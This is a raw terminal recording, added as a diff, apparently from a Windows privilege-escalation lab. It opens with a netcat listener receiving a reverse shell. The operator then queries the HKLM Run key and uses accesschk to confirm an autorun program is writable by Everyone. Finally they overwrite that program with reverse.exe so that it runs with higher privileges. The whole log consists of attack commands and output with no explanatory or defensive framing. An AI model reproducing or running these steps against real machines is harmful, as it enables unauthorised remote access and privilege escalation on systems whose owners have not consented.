@@ -1,0 +1,41 @@
+Script started on 2025-03-16 06:49:36+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 10429
+[KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737][KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mreg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+[Kreg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+[K
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mC:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+[KC:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+[K
+AccessChk v4.02 - Check access of files, keys, objects, processes or services
+Copyright (C) 2006-2007 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files\Autorun Program\program.exe
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+	FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+	FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+	FILE_ALL_ACCESS
+  RW WIN-QBA94KB3IOF\Administrator
+	FILE_ALL_ACCESS
+  RW BUILTIN\Users
+	FILE_ALL_ACCESS
+[K
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mcopy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcopy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+[Kcopy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+[K        1 file(s) copied.
+
+C:\Users\user>[KC:\Users\user>[?2004l
+
+Script done on 2025-03-16 06:55:43+03:00 [COMMAND_EXIT_CODE="0"]
